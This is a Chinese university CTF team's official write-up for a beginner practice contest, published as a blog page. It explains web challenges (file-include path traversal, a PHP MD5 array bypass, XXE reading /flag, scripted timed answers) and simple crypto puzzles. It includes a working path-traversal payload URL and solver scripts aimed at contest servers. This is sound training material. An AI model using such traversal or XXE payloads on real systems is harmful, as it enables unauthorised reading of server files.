@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-undefined.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wiki.w-ais.cn","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="因为疫情的原因，大家在家闲着(大家内心：并不)也是闲着，不如就搭建一个平台，找一些签到题来训练一下新人，至少让新人知道比赛的流程还有一些注意事项，一些基本的操作等，题目来源于各种开源代码，包括南邮的校赛和suctf的题目。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp">
+<meta property="og:url" content="https://wiki.w-ais.cn/2020/02/08/wust_funnyctf_WriteUp/index.html">
+<meta property="og:site_name" content="WUST-AIS">
+<meta property="og:description" content="因为疫情的原因，大家在家闲着(大家内心：并不)也是闲着，不如就搭建一个平台，找一些签到题来训练一下新人，至少让新人知道比赛的流程还有一些注意事项，一些基本的操作等，题目来源于各种开源代码，包括南邮的校赛和suctf的题目。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RD1r4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDGZ9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDK2T.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDJaR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDYI1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDNPx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDdxO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDOzT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDBse.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDydA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RD2JP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDRRf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDWz8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDhQS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RD4sg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RD5LQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RD7on.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDjQU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDvyF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RH0lF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDnP0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDUG6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDDqH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RD6II.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDgit.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RHDOJ.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDoZj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDTds.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RDxL4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1RHBy4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W9Lh4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W9j39.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W9vcR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W9xj1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1WCSnx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1WCpB6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1WC9HK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1WCPAO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1WCiND.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/09/1fIFU0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/09/1fIiEq.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W9TBV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W977T.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W94cn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W95Xq.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W9h1s.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W9bAU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/08/1W9qNF.png">
+<meta property="article:published_time" content="2020-02-08T07:45:38.000Z">
+<meta property="article:modified_time" content="2020-04-16T15:06:18.418Z">
+<meta property="article:author" content="WUST-AIS">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WriteUps">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2020/02/08/1RD1r4.png">
+
+<link rel="canonical" href="https://wiki.w-ais.cn/2020/02/08/wust_funnyctf_WriteUp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp | WUST-AIS</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WUST-AIS</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wiki.w-ais.cn/2020/02/08/wust_funnyctf_WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/logo.png">
+      <meta itemprop="name" content="WUST-AIS">
+      <meta itemprop="description" content="Join us">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WUST-AIS">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp
+        </h1>
+
+        <div class="post-meta">
+           
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-02-08 15:45:38" itemprop="dateCreated datePublished" datetime="2020-02-08T15:45:38+08:00">2020-02-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-16 23:06:18" itemprop="dateModified" datetime="2020-04-16T23:06:18+08:00">2020-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>因为疫情的原因，大家在家闲着(大家内心：并不)也是闲着，不如就搭建一个平台，找一些签到题来训练一下新人，至少让新人知道比赛的流程还有一些注意事项，一些基本的操作等，题目来源于各种开源代码，包括南邮的校赛和suctf的题目。</p>
+<a id="more"></a>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><p>顾名思义，就是Web的签到题，但我没有想到比隔壁稍微复杂一点的签到题更少人解出来，有点出乎意料。以后这种就不能丢。</p>
+<p>题目描述是：去百度签个到吧。这题来源于<code>NCTF2018</code>的签到题，打开题目链接，就是百度，但是我们注意到地址栏上面的是 <code>/secret.php</code>，按理说应该是 <code>index.php</code> 或者后面为空，这就心生怀疑，于是打开 <code>Burpsuite</code> 等抓包工具一步一步来，这里为了简便我直接用浏览器的<code>f12</code>，这个方法更简单更快。</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RD1r4.png" alt="1RD1r4.png"></p>
+<p>我们鼠标放在题目链接的时候细心可以注意到链接是 <code>www.cohacker.cn:5011</code>，但是我们打开的界面是 <code>/secret.php</code>，这就有点不对劲。打开<code>f12</code>，访问 <code>www.cohacker.cn:5011</code> ，可以看到有一个 <code>302</code> 跳转，查看头就可以找到 <code>flag</code> 了。</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDGZ9.png" alt="1RDGZ9.png"></p>
+<p>因为有个跳转，所以大家可能抓的时候没留意，并且要看 <code>Response</code> 头部，可能都看 <code>secret.php</code> 的头部去了。</p>
+<h3 id="Crossover"><a href="#Crossover" class="headerlink" title="Crossover"></a>Crossover</h3><p>这题是 <code>HCTF2018</code> 的签到题(又是签到题)，主要考点是 <code>include()</code> 文件包含的漏洞和目录穿越，打开题目又是熟悉的滑稽，常规操作查看源代码。</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDK2T.png" alt="1RDK2T.png"></p>
+<p>发现有 <code>source.php</code>，访问可得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>REQUSET</code> 时需要传参 <code>file</code> ，并且需要是字符串，同时要过 <code>checkFile</code> 的函数检测，分析代码我们可以看到白名单，只能传 <code>source.php</code> 和 <code>hint.php</code>。可以利用<code>?</code>截取<code>hint.php</code>，然后利用<code>/</code>使<code>hint.php?</code>成为一个不存在的目录，最后<code>include</code>利用<code>../../</code>跳转目录读取flag。访问<code>hint.php</code>得到 <code>flag not here, and flag in ffffllllaaaagggg</code>，于是构造payload：<code>http://49.235.15.37:8081/index.php?file=hint.php?/../../../../../../../../../ffffllllaaaagggg</code> 得到flag。</p>
+<h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><p>点击链接，直接就可以看见源码，对源码进行一波分析：</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDJaR.png" alt="1RDJaR.png"></p>
+<p>通过分析，大致可以了解到这里需要传入参数 <code>value</code>，满足与<code>whoami</code>的值相同要满足10次，且要绕过md5函数</p>
+<p>所以这里value传入数组，用来绕过MD5函数(当然爆破出符合的md5也行)。且开始时<code>whoami</code>里面的值为‘ea’，所以构造如下：</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDYI1.png" alt="1RDYI1.png"></p>
+<p>（此时发现页面的开头又回显出两个新的字母，然后将ea改为这两个字母）</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDNPx.png" alt="1RDNPx.png"></p>
+<p>再次构造<code>url</code>为：<code>?value[]=qk</code> (注意，每个人回显的都不一样，在2分钟内重复这样的操作10次就能拿到flag</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDdxO.png" alt="1RDdxO.png"></p>
+<p>写脚本也是很快的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="string">''' # 这是爆破md5的方法，这里也可以不用</span></span><br><span class="line"><span class="string">def get_value(given):</span></span><br><span class="line"><span class="string">	global dict_az</span></span><br><span class="line"><span class="string">	for i in range(1000000):</span></span><br><span class="line"><span class="string">		result = given</span></span><br><span class="line"><span class="string">		result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">		result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">		result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">		result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">		result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">		m = hashlib.md5(result)</span></span><br><span class="line"><span class="string">		m = m.hexdigest()</span></span><br><span class="line"><span class="string">		if m[5:9] == "0000":</span></span><br><span class="line"><span class="string">			print("success")</span></span><br><span class="line"><span class="string">			print(m)</span></span><br><span class="line"><span class="string">			return result</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			pass</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url_s)</span>:</span></span><br><span class="line">	session = requests.Session()</span><br><span class="line">	result = <span class="string">"ea"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">		url = url_s</span><br><span class="line">		resp = session.get(url+result)</span><br><span class="line">		the_page = resp.text</span><br><span class="line">		<span class="comment"># result = get_value(the_page[0:2])</span></span><br><span class="line">		result = the_page[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">		print(<span class="string">"nums = %d"</span> % i)</span><br><span class="line">	index_1 = the_page.find(<span class="string">"wctf"</span>)</span><br><span class="line">	index_2 = the_page.find(<span class="string">"&#125;"</span>)</span><br><span class="line">	print(the_page[index_1:index_2+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	dict_az = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">	url = <span class="string">"http://www.cohacker.cn:23123/challenge13.php?value[]="</span></span><br><span class="line">	main(url)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDOzT.png" alt="1RDOzT.png"></p>
+<h3 id="男人就要快："><a href="#男人就要快：" class="headerlink" title="男人就要快："></a>男人就要快：</h3><p>进入链接，看到页面：</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDBse.png" alt="1RDBse.png"></p>
+<p>（英语不好的，直接放百度翻译翻译一下）</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDydA.png" alt="1RDydA.png"></p>
+<p>大致意思呢就是提交’true’或者’false’，判断页面的那个式子是否正确，需要连续判断20次，且每一次都要判断正确（这里有个小坑就是，不是让你提交最后的结果，而是提交true或者false），还有一个小坑就是需要在1-2s内提交（注意，提交需要超过一秒，但是不能慢于两秒）</p>
+<p>所以，这里是用Python脚本来处理（需要了解的模块，<code>request</code>， <code>re</code>或者<code>BeautifulSoup</code>，<code>time</code>模块）</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RD2JP.png" alt="1RD2JP.png"></p>
+<p>20s之后，就可以拿到flag</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDRRf.png" alt="1RDRRf.png"></p>
+<h3 id="你太闲了"><a href="#你太闲了" class="headerlink" title="你太闲了"></a>你太闲了</h3><p><img src="https://s2.ax1x.com/2020/02/08/1RDWz8.png" alt="1RDWz8.png"></p>
+<p>一开始就这样一个界面，我们去看一下前端的代码：<img src="https://s2.ax1x.com/2020/02/08/1RDhQS.png" alt="1RDhQS.png"></p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RD4sg.png" alt="1RD4sg.png"></p>
+<p>我们页面随便输一下内容</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RD5LQ.png" alt="1RD5LQ.png"></p>
+<p>发现它将 <code>UserName</code> 的内容输出到页面上，跟XML有关的漏洞，我们这里尝试使用XXE（外部实体注入）漏洞—OWASP TOP 10 漏洞之一</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RD7on.png" alt="1RD7on.png"></p>
+<p>根据提示，flag放在/flag里面，我们读取一下：</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDjQU.png" alt="1RDjQU.png"></p>
+<p>然后就得到flag了</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDvyF.png" alt="1RDvyF.png"></p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RH0lF.png" alt="1RH0lF.png"></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>这次的密码学题目主要目的就是把一些奇淫技巧都让新人见识一下，因此抽取了一些比较无脑的题目，直接在线跑就可以。</p>
+<h3 id="你是猪吗"><a href="#你是猪吗" class="headerlink" title="你是猪吗"></a>你是猪吗</h3><p>题目说得很明显了，跟猪有关，不难想到是猪圈密码，百度找到猪圈密码，对应把 flag 拼出来就可以，这里 flag 设置了大小写不敏感，也算是降低了难度，送分题。</p>
+<p><a href="https://en.wikipedia.org/wiki/Pigpen_cipher" target="_blank" rel="noopener">参考资料：维基百科-Pigpen_cipher</a></p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDnP0.png" alt="1RDnP0.png"></p>
+<h3 id="knock-knock"><a href="#knock-knock" class="headerlink" title="knock knock"></a>knock knock</h3><p>摩斯电码，没有什么技术含量，也是调查问卷评为无聊的一题了，直接百度Google一把梭找到链接直接转换，题目提示了 flag 为有意义小写字母及数字，所以要是转成大写的得自己转成小写，送分题。</p>
+<h3 id="F-k-your-brain"><a href="#F-k-your-brain" class="headerlink" title="F**k your brain"></a>F**k your brain</h3><p>brainfuck 编码，也是Google一下就找到在线网站，直接解编码就可以，主要是需要认得出来和学会根据题目等信息去寻找信息，送分题。</p>
+<h3 id="look-at-your-keyboard"><a href="#look-at-your-keyboard" class="headerlink" title="look at your keyboard"></a>look at your keyboard</h3><p>关键词 keyboard，那就看键盘，可以看到每一个以空格分隔的字符串，在键盘上刚好圈出一个字母，加上格式 wctf{} 即可，送分题。</p>
+<h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>根据题目不难想到是base编码的变种，并且table都已经给出来了，不懂的可以参考<a href="https://en.wikipedia.org/wiki/Base64" target="_blank" rel="noopener">维基百科-base64</a>，题目只是把表换了一下，并且这种题可以先根据表把给出的编码字母替换掉，再进行正常的 base64 解码，这样操作就比较简单。</p>
+<p>手动也能做，这里贴一下脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">string1 = <span class="string">"wctfEFGHIOPQJKLMNRSTUVklmWXYZabBdeDghijnop45678qrsCuvAxyz01239+/"</span></span><br><span class="line">string2 = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">base = <span class="string">b'axKvWn7DmlKiKgRBJlKBWnV8BN=='</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> base:</span><br><span class="line">	<span class="keyword">if</span> chr(i) != <span class="string">'='</span>:</span><br><span class="line">		index = string1.find(chr(i))</span><br><span class="line">		flag += string2[index]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		flag += <span class="string">'='</span></span><br><span class="line">print(flag)</span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d2N0ZntiYXNlNjRfMXNfZnVufQ==</span><br><span class="line">b'wctf&#123;base64_1s_fun&#125;'</span><br><span class="line">[Finished in 0.1s]</span><br></pre></td></tr></table></figure>
+
+<p>密码学题都是送分题，这里不多说。</p>
